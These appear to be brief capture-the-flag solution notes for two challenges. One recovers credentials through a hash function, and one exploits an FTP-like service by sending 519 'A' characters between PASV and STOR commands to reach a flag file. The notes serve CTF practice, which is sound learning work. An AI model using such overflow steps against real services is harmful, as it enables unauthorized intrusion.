RE 200

simple hash function shown below

int hash(char* word){
	int counter, hashAddress = 5381;
	for (counter = 0; word[counter]!='\0'; counter++){
	    hashAddress = ((hashAddress << 5) + hashAddress) + word[counter];
	}
	return hashAddress;
}


brute force or theorem solver username is blankwall pass is cookie

use retr to retrieve a flag named re_solution.txt



Exploitation 300

log in with credentials 

pasv

in different window connect to port shown by output
stor abcd

send 519 "A"'s in other terminal window 
close connection in other terminal window

pasv command again

retr flag.txt
